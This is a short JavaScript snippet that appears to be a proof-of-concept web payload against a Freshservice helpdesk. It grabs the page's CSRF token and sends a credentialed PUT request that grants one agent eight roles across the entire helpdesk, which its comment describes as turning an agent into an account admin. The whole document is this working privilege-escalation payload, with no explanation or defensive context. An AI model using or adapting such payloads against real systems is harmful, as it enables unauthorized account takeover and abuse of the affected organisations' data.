async function sendRequests() {
    try {
        // First step call Csrf-Token by create variable and used var name in the headers
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

        // Execute PUT request that convert Agent ==> account admin
        await fetch('https://proof.freshservice.com/api/_/agents/59000849653/map_workspace_groups_and_roles', {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken
            },
            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000141444,"assignment_scope":"entire_helpdesk"},{"role_id":59000141445,"assignment_scope":"entire_helpdesk"},{"role_id":59000141446,"assignment_scope":"entire_helpdesk"},{"role_id":59000141447,"assignment_scope":"entire_helpdesk"},{"role_id":59000141448,"assignment_scope":"entire_helpdesk"},{"role_id":59000141449,"assignment_scope":"entire_helpdesk"},{"role_id":59000141450,"assignment_scope":"entire_helpdesk"},{"role_id":59000141451,"assignment_scope":"entire_helpdesk"}],"workspace_id":2}`
        });

        console.log('Requests completed successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

sendRequests();
